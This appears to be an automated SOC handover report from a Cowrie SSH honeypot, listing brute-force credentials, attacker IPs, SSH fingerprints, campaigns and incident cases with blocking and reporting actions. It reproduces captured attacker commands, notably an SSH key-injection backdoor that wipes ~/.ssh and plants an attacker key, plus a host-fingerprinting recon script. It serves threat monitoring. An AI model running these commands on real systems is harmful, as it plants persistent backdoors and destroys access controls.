# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-30 |
| **Generated At** | 2026-06-30T14:28:23Z |
| **Shift Time** | 14:28 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **107** |
| Confirmed Threats | **97** |
| False Positives Filtered | **10** (9.3%) |
| Unique Attacker IPs | **28** |
| Countries of Origin | **9** |
| High Severity Cases | **51** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **56** |
| Malware Samples Analyzed | **5** HIGH · **40** MED · 0 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **62** |
| Unique Credential Pairs | **49** |
| Unique Usernames | **11** |
| Unique Passwords | **45** |
| Successful Auth Pairs | **56** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 40 |
| `345gs5662d34` | 5 |
| `ubuntu` | 5 |
| `nagios` | 3 |
| `test-user` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 5 |
| `345gs5662d34` | 5 |
| `LeitboGi0ro` | 4 |
| `zaq12wsx` | 3 |
| `password` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 5 |
| `root` | `LeitboGi0ro` | 4 |
| `nagios` | `zaq12wsx` | 3 |
| `root` | `3245gs5662d34` | 2 |
| `root` | `123@@@` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `password` | `45.61.186.204` | 2026-06-30T10:55:24 |
| `test-user` | `password` | `10.0.0.73` | 2026-06-30T10:56:12 |
| `test-user` | `3245gs5662d34` | `10.0.0.73` | 2026-06-30T10:56:29 |
| `root` | `deneme12` | `10.0.0.73` | 2026-06-30T10:57:18 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-06-30T10:57:22 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-06-30T10:57:24 |
| `root` | `---fuck_you----` | `115.190.248.35` | 2026-06-30T10:59:14 |
| `ubuntu` | `password12` | `45.198.224.120` | 2026-06-30T11:00:44 |
| `root` | `zinch` | `45.205.1.42` | 2026-06-30T11:02:56 |
| `nagios` | `zaq12wsx` | `185.242.3.195` | 2026-06-30T11:03:50 |
| `ubuntu` | `123456@qwe` | `119.28.49.103` | 2026-06-30T11:06:24 |
| `345gs5662d34` | `345gs5662d34` | `119.28.49.103` | 2026-06-30T11:06:28 |
| `ubuntu` | `3245gs5662d34` | `119.28.49.103` | 2026-06-30T11:06:30 |
| `dzb` | `dzb123` | `10.0.0.73` | 2026-06-30T11:11:30 |
| `dzb` | `3245gs5662d34` | `10.0.0.73` | 2026-06-30T11:11:36 |
| `inspur` | `inspur` | `45.198.224.120` | 2026-06-30T11:12:54 |
| `root` | `kingofking` | `45.205.1.42` | 2026-06-30T11:18:04 |
| `ubuntu` | `aa123456` | `124.223.187.91` | 2026-06-30T11:20:10 |
| `345gs5662d34` | `345gs5662d34` | `124.223.187.91` | 2026-06-30T11:20:15 |
| `root` | `s198364mply` | `45.198.224.120` | 2026-06-30T11:24:54 |
| `root` | `LeitboGi0ro` | `158.178.141.210` | 2026-06-30T11:29:11 |
| `root` | `123@@@` | `158.178.141.210` | 2026-06-30T11:29:11 |
| `root` | `L1nuxAdmin#Secure` | `45.205.1.42` | 2026-06-30T11:33:14 |
| `root` | `rootroot` | `45.198.224.120` | 2026-06-30T11:37:05 |
| `nagios` | `zaq12wsx` | `10.0.0.73` | 2026-06-30T11:43:57 |
| `root` | `Pa$sw0rd!` | `45.205.1.42` | 2026-06-30T11:48:23 |
| `root` | `Plm123plm` | `45.198.224.120` | 2026-06-30T11:49:11 |
| `root` | `qazxswedc123` | `45.198.224.120` | 2026-06-30T12:01:21 |
| `vnc` | `vnc` | `45.205.1.42` | 2026-06-30T12:04:09 |
| `root` | `PaSSWord` | `45.198.224.120` | 2026-06-30T12:13:33 |
| `root` | `﻿------fuck------` | `10.0.0.73` | 2026-06-30T12:16:09 |
| `root` | `qwerasdfzxcv` | `45.205.1.42` | 2026-06-30T12:19:58 |
| `root` | `qqwwee1234` | `45.198.224.120` | 2026-06-30T12:25:37 |
| `root` | `qwer123.com` | `185.242.3.195` | 2026-06-30T12:34:58 |
| `root` | `QWE123qwe` | `45.205.1.42` | 2026-06-30T12:35:47 |
| `root` | `1` | `195.178.110.228` | 2026-06-30T12:36:49 |
| `root` | `asd` | `45.198.224.120` | 2026-06-30T12:37:43 |
| `root` | `12` | `195.178.110.228` | 2026-06-30T12:38:31 |
| `root` | `123` | `195.178.110.228` | 2026-06-30T12:40:26 |
| `root` | `1234` | `195.178.110.228` | 2026-06-30T12:42:12 |
| `root` | `12345` | `195.178.110.228` | 2026-06-30T12:44:01 |
| `root` | `1234567` | `195.178.110.228` | 2026-06-30T12:47:57 |
| `ubuntu` | `ubuntu12` | `45.198.224.120` | 2026-06-30T12:49:11 |
| `root` | `﻿------fuck------` | `112.91.141.230` | 2026-06-30T12:49:39 |
| `root` | `12345678` | `195.178.110.228` | 2026-06-30T12:50:08 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.76.137.133` | 2026-06-30T12:50:53 |
| `*1` | `$4` | `34.76.137.133` | 2026-06-30T12:51:02 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 4807` | `34.76.137.133` | 2026-06-30T12:51:03 |
| `root` | `admin!23$` | `107.174.82.77` | 2026-06-30T12:51:07 |
| `345gs5662d34` | `345gs5662d34` | `107.174.82.77` | 2026-06-30T12:51:09 |
| `root` | `3245gs5662d34` | `107.174.82.77` | 2026-06-30T12:51:10 |
| `root` | `ROsLNa1O&#039;ZHGNOI` | `45.205.1.42` | 2026-06-30T12:52:01 |
| `root` | `123456789` | `195.178.110.228` | 2026-06-30T12:52:36 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-06-30T12:54:18 |
| `root` | `123@@@` | `129.153.145.135` | 2026-06-30T12:54:19 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-06-30T12:54:20 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **107** |
| Sessions with Fingerprint | **9** |
| Unique HASSH Fingerprints | **9** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 36 |
| libssh | 10 |
| Paramiko (Python) | 8 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `16443846184e...` | Generic scanner | 22 | 4 |
| `2ec37a7cc8da...` | Mirai/variant | 9 | 1 |
| `f555226df196...` | Mirai/variant | 8 | 3 |
| `6372ee695756...` | Modern SSH client | 4 | 1 |
| `a2de0f306611...` | Mirai/variant | 4 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `16443846184e...` | Go SSH scanner | 22 | 4 | Generic scanner |
| `2ec37a7cc8da...` | Go SSH scanner | 9 | 1 | Mirai/variant |
| `f555226df196...` | libssh | 8 | 3 | Mirai/variant |
| `6372ee695756...` | Paramiko (Python) | 4 | 1 | Modern SSH client |
| `a2de0f306611...` | Paramiko (Python) | 4 | 1 | Mirai/variant |
| `95420f9d932d...` | Go SSH scanner | 3 | 3 | — |
| `98f63c4d9c87...` | Go SSH scanner | 2 | 2 | Generic scanner |
| `944eec3005f2...` | libssh | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **7** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 8 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `195.178.110.228`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `124.223.187.91`, `119.28.49.103`, `107.174.82.77`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **28** |
| Unique ASNs | **23** |
| High-Risk ASNs | **22** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |
| `AS45090` | Shenzhen Tencent Computer Systems Company Limited | 2 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS215925` | VPSVAULT.HOST LTD | 2 | HIGH |
| `AS31898` | Oracle Corporation | 2 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 1 | HIGH |
| `AS211298` | Driftnet Ltd | 1 | HIGH |
| `AS6939` | Hurricane Electric LLC | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (43)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-9bb0faa434b8

| Field | Detail |
|---|---|
| **Source IP** | `45.61.186[.]204` |
| **First Seen** | 2026-06-30 10:55 |
| **Last Seen** | 2026-06-30 10:55 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 10:55:13` | `cowrie.session.connect` |
| `2026-06-30 10:55:14` | `cowrie.client.version` |
| `2026-06-30 10:55:18` | `cowrie.client.kex` |
| `2026-06-30 10:55:24` | `cowrie.login.success` |
| `2026-06-30 10:55:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.61.186[.]204` to AbuseIPDB if not already reported
- [ ] Block `45.61.186[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2205b61adb9c

| Field | Detail |
|---|---|
| **Source IP** | `115.190.248[.]35` |
| **First Seen** | 2026-06-30 10:59 |
| **Last Seen** | 2026-06-30 10:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 10:59:12` | `cowrie.session.connect` |
| `2026-06-30 10:59:12` | `cowrie.client.version` |
| `2026-06-30 10:59:13` | `cowrie.client.kex` |
| `2026-06-30 10:59:14` | `cowrie.login.success` |
| `2026-06-30 10:59:15` | `cowrie.session.params` |
| `2026-06-30 10:59:15` | `cowrie.command.input` |
| `2026-06-30 10:59:16` | `cowrie.log.closed` |
| `2026-06-30 10:59:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.248[.]35` to AbuseIPDB if not already reported
- [ ] Block `115.190.248[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ab658ceed9f

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 11:00 |
| **Last Seen** | 2026-06-30 11:00 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 11:00:36` | `cowrie.session.connect` |
| `2026-06-30 11:00:37` | `cowrie.client.version` |
| `2026-06-30 11:00:37` | `cowrie.client.kex` |
| `2026-06-30 11:00:44` | `cowrie.login.success` |
| `2026-06-30 11:00:47` | `cowrie.session.params` |
| `2026-06-30 11:00:47` | `cowrie.command.input` |
| `2026-06-30 11:00:49` | `cowrie.log.closed` |
| `2026-06-30 11:00:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f19b2b27d10

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-30 11:02 |
| **Last Seen** | 2026-06-30 11:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 11:02:54` | `cowrie.session.connect` |
| `2026-06-30 11:02:54` | `cowrie.client.version` |
| `2026-06-30 11:02:54` | `cowrie.client.kex` |
| `2026-06-30 11:02:56` | `cowrie.login.success` |
| `2026-06-30 11:02:57` | `cowrie.session.params` |
| `2026-06-30 11:02:57` | `cowrie.command.input` |
| `2026-06-30 11:02:58` | `cowrie.log.closed` |
| `2026-06-30 11:02:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e981bedbc04

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-06-30 11:03 |
| **Last Seen** | 2026-06-30 11:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 11:03:50` | `cowrie.session.connect` |
| `2026-06-30 11:03:50` | `cowrie.client.version` |
| `2026-06-30 11:03:50` | `cowrie.client.kex` |
| `2026-06-30 11:03:50` | `cowrie.login.success` |
| `2026-06-30 11:03:51` | `cowrie.session.params` |
| `2026-06-30 11:03:51` | `cowrie.command.input` |
| `2026-06-30 11:03:51` | `cowrie.log.closed` |
| `2026-06-30 11:03:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66a1d0f9d99b

| Field | Detail |
|---|---|
| **Source IP** | `119.28.49[.]103` |
| **First Seen** | 2026-06-30 11:06 |
| **Last Seen** | 2026-06-30 11:06 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 11:06:23` | `cowrie.session.connect` |
| `2026-06-30 11:06:23` | `cowrie.client.version` |
| `2026-06-30 11:06:23` | `cowrie.client.kex` |
| `2026-06-30 11:06:24` | `cowrie.login.success` |
| `2026-06-30 11:06:25` | `cowrie.session.params` |
| `2026-06-30 11:06:25` | `cowrie.command.input` |
| `2026-06-30 11:06:25` | `cowrie.command.failed` |
| `2026-06-30 11:06:26` | `cowrie.log.closed` |
| `2026-06-30 11:06:26` | `cowrie.session.params` |
| `2026-06-30 11:06:26` | `cowrie.command.input` |
| `2026-06-30 11:06:27` | `cowrie.session.file_download` |
| `2026-06-30 11:06:27` | `cowrie.log.closed` |
| `2026-06-30 11:06:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.28.49[.]103` to AbuseIPDB if not already reported
- [ ] Block `119.28.49[.]103` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c364c0b15df8

| Field | Detail |
|---|---|
| **Source IP** | `119.28.49[.]103` |
| **First Seen** | 2026-06-30 11:06 |
| **Last Seen** | 2026-06-30 11:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 11:06:27` | `cowrie.session.connect` |
| `2026-06-30 11:06:27` | `cowrie.client.version` |
| `2026-06-30 11:06:27` | `cowrie.client.kex` |
| `2026-06-30 11:06:28` | `cowrie.login.success` |
| `2026-06-30 11:06:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.28.49[.]103` to AbuseIPDB if not already reported
- [ ] Block `119.28.49[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1a487875441

| Field | Detail |
|---|---|
| **Source IP** | `119.28.49[.]103` |
| **First Seen** | 2026-06-30 11:06 |
| **Last Seen** | 2026-06-30 11:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 11:06:28` | `cowrie.session.connect` |
| `2026-06-30 11:06:28` | `cowrie.client.version` |
| `2026-06-30 11:06:29` | `cowrie.client.kex` |
| `2026-06-30 11:06:30` | `cowrie.login.success` |
| `2026-06-30 11:06:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.28.49[.]103` to AbuseIPDB if not already reported
- [ ] Block `119.28.49[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ed240aac79e

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 11:12 |
| **Last Seen** | 2026-06-30 11:12 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 11:12:46` | `cowrie.session.connect` |
| `2026-06-30 11:12:48` | `cowrie.client.version` |
| `2026-06-30 11:12:48` | `cowrie.client.kex` |
| `2026-06-30 11:12:54` | `cowrie.login.success` |
| `2026-06-30 11:12:57` | `cowrie.session.params` |
| `2026-06-30 11:12:57` | `cowrie.command.input` |
| `2026-06-30 11:12:58` | `cowrie.log.closed` |
| `2026-06-30 11:12:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0071d05fd042

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-30 11:18 |
| **Last Seen** | 2026-06-30 11:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 11:18:02` | `cowrie.session.connect` |
| `2026-06-30 11:18:03` | `cowrie.client.version` |
| `2026-06-30 11:18:03` | `cowrie.client.kex` |
| `2026-06-30 11:18:04` | `cowrie.login.success` |
| `2026-06-30 11:18:05` | `cowrie.session.params` |
| `2026-06-30 11:18:05` | `cowrie.command.input` |
| `2026-06-30 11:18:06` | `cowrie.log.closed` |
| `2026-06-30 11:18:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7024880abdd2

| Field | Detail |
|---|---|
| **Source IP** | `124.223.187[.]91` |
| **First Seen** | 2026-06-30 11:20 |
| **Last Seen** | 2026-06-30 11:25 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 11:20:08` | `cowrie.session.connect` |
| `2026-06-30 11:20:08` | `cowrie.client.version` |
| `2026-06-30 11:20:09` | `cowrie.client.kex` |
| `2026-06-30 11:20:10` | `cowrie.login.success` |
| `2026-06-30 11:20:11` | `cowrie.session.params` |
| `2026-06-30 11:20:11` | `cowrie.command.input` |
| `2026-06-30 11:20:11` | `cowrie.command.failed` |
| `2026-06-30 11:20:12` | `cowrie.log.closed` |
| `2026-06-30 11:20:13` | `cowrie.session.params` |
| `2026-06-30 11:20:13` | `cowrie.command.input` |
| `2026-06-30 11:20:13` | `cowrie.session.file_download` |
| `2026-06-30 11:20:13` | `cowrie.log.closed` |
| `2026-06-30 11:25:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.223.187[.]91` to AbuseIPDB if not already reported
- [ ] Block `124.223.187[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f55e8457a5d

| Field | Detail |
|---|---|
| **Source IP** | `124.223.187[.]91` |
| **First Seen** | 2026-06-30 11:20 |
| **Last Seen** | 2026-06-30 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 11:20:13` | `cowrie.session.connect` |
| `2026-06-30 11:20:13` | `cowrie.client.version` |
| `2026-06-30 11:20:14` | `cowrie.client.kex` |
| `2026-06-30 11:20:15` | `cowrie.login.success` |
| `2026-06-30 11:20:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.223.187[.]91` to AbuseIPDB if not already reported
- [ ] Block `124.223.187[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-325d596e0f12

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 11:24 |
| **Last Seen** | 2026-06-30 11:24 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 11:24:47` | `cowrie.session.connect` |
| `2026-06-30 11:24:48` | `cowrie.client.version` |
| `2026-06-30 11:24:48` | `cowrie.client.kex` |
| `2026-06-30 11:24:54` | `cowrie.login.success` |
| `2026-06-30 11:24:57` | `cowrie.session.params` |
| `2026-06-30 11:24:57` | `cowrie.command.input` |
| `2026-06-30 11:24:59` | `cowrie.log.closed` |
| `2026-06-30 11:24:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ea7471ea946

| Field | Detail |
|---|---|
| **Source IP** | `158.178.141[.]210` |
| **First Seen** | 2026-06-30 11:29 |
| **Last Seen** | 2026-06-30 11:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 11:29:10` | `cowrie.session.connect` |
| `2026-06-30 11:29:10` | `cowrie.client.version` |
| `2026-06-30 11:29:10` | `cowrie.client.kex` |
| `2026-06-30 11:29:11` | `cowrie.login.success` |
| `2026-06-30 11:29:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.178.141[.]210` to AbuseIPDB if not already reported
- [ ] Block `158.178.141[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ecafa506847

| Field | Detail |
|---|---|
| **Source IP** | `158.178.141[.]210` |
| **First Seen** | 2026-06-30 11:29 |
| **Last Seen** | 2026-06-30 11:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 11:29:10` | `cowrie.session.connect` |
| `2026-06-30 11:29:10` | `cowrie.client.version` |
| `2026-06-30 11:29:10` | `cowrie.client.kex` |
| `2026-06-30 11:29:11` | `cowrie.login.success` |
| `2026-06-30 11:29:11` | `cowrie.session.closed` |

**Recommended Actions:**
